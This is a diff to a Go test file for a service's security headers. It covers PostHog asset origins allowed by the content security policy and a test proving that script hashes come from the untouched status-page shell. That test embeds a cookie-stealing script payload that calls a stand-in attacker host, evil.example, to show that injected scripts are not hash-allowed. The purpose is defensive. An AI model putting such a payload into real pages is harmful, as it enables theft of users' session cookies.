@@ -306,8 +306,30 @@ func TestDashboardThirdPartyOrigins(t *testing.T) {
 	r.Equal([]string{"https://eu.posthog.com"}, dashboardThirdPartyOrigins(proxied),
 		"with the /ingest proxy only the UI host (toolbar) is external")
 
+	// Negative control: a self-hosted PostHog serves /static/ itself, so no
+	// -assets origin is invented for it.
 	selfHosted := config.PostHogConfig{Enabled: true, ProjectAPIKey: "phc_x", Host: "https://ph.acme.com/"}
 	r.Equal([]string{"https://ph.acme.com"}, dashboardThirdPartyOrigins(selfHosted))
+
+	// PostHog Cloud ingestion hosts: posthog-js loads its recorder,
+	// exception-autocapture and surveys bundles from the regional -assets host.
+	for region, want := range map[string]string{
+		"eu": "https://eu-assets.i.posthog.com",
+		"us": "https://us-assets.i.posthog.com",
+	} {
+		cloud := config.PostHogConfig{Enabled: true, ProjectAPIKey: "phc_x", Host: "https://" + region + ".i.posthog.com"}
+		r.Equal([]string{"https://" + region + ".i.posthog.com", want}, dashboardThirdPartyOrigins(cloud), region)
+	}
+
+	r.Equal(config.DefaultPostHogAssetsHost, postHogCloudAssetsOrigin(config.DefaultPostHogHost),
+		"the rule must agree with the proxy's own EU assets host")
+
+	for _, notCloud := range []string{
+		"", "http://eu.i.posthog.com", "https://eu-assets.i.posthog.com",
+		"https://evil.acme.com.i.posthog.com", "https://i.posthog.com", "https://eu.i.posthog.com.acme.com",
+	} {
+		r.Empty(postHogCloudAssetsOrigin(notCloud), notCloud)
+	}
 }
 
 func TestBaselineOnDocsOpenAPIAndNotFound(t *testing.T) {
@@ -405,4 +427,65 @@ func TestSecurityHeadersThroughTheRealRouter(t *testing.T) {
 
 	openapi := get("/openapi")
 	r.Equal("SAMEORIGIN", openapi.Get(securityheaders.HeaderFrameOptions))
+}
+
+// TestStatusPageShellHashesComeFromTheUntouchedShell pins that the shell's
+// script-src hashes are those of the embedded index.html as the build emitted
+// it, never of the per-request bytes: the served shell is rewritten with page
+// metadata, and hashing after the rewrite would hash-allow any <script> an
+// injection bug smuggled into it.
+func TestStatusPageShellHashesComeFromTheUntouchedShell(t *testing.T) {
+	t.Parallel()
+	r := require.New(t)
+	ctx := t.Context()
+
+	server, _ := newSecurityHeadersTestServer(t)
+
+	serve := func(path string) *httptest.ResponseRecorder {
+		req := httptest.NewRequestWithContext(ctx, http.MethodGet, path, nil)
+		rec := httptest.NewRecorder()
+		r.NoError(server.serveStatus0Static(rec, req))
+
+		return rec
+	}
+
+	rawHashes := securityheaders.InlineScriptHashes([]byte(status0ShellWithInlineScript))
+	r.Len(rawHashes, 1)
+
+	rec := serve("/s/acme/main")
+	script := cspDirective(t, rec.Header().Get(securityheaders.HeaderCSP), "script-src")
+	r.Equal(append([]string{"'self'"}, rawHashes...), script)
+
+	// Now the served shell carries a script the build never emitted — the
+	// shape of an injection bug. It reaches the body, but not the policy.
+	const smuggled = `<script>fetch("https://evil.example/"+document.cookie)</script>`
+	server.status0FS = fstest.MapFS{
+		"status0res/index.html": &fstest.MapFile{
+			Data: []byte(strings.Replace(status0ShellWithInlineScript, "</head>", smuggled+"</head>", 1)),
+		},
+	}
+
+	rec = serve("/s/acme/main")
+	r.Contains(rec.Body.String(), smuggled, "precondition: the rogue script is in the served bytes")
+
+	smuggledHash := securityheaders.InlineScriptHashes([]byte(smuggled))
+	r.Len(smuggledHash, 1)
+
+	script = cspDirective(t, rec.Header().Get(securityheaders.HeaderCSP), "script-src")
+	r.NotContains(script, smuggledHash[0], "a script absent from the pristine shell must not be hash-allowed")
+	r.Equal(append([]string{"'self'"}, rawHashes...), script)
+
+	// Same rule on a custom domain.
+	custom := newCustomHostTestServer(t)
+	custom.status0FS = fstest.MapFS{
+		"status0res/index.html": &fstest.MapFile{Data: []byte(status0ShellWithInlineScript)},
+	}
+
+	customReq := httptest.NewRequestWithContext(ctx, http.MethodGet, "/", nil)
+	customReq.Host = "status.acme.com"
+	customRec := httptest.NewRecorder()
+	custom.handlerWithCustomDomains(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {})).
+		ServeHTTP(customRec, customReq)
+	r.Equal(append([]string{"'self'"}, rawHashes...),
+		cspDirective(t, customRec.Header().Get(securityheaders.HeaderCSP), "script-src"))
 }
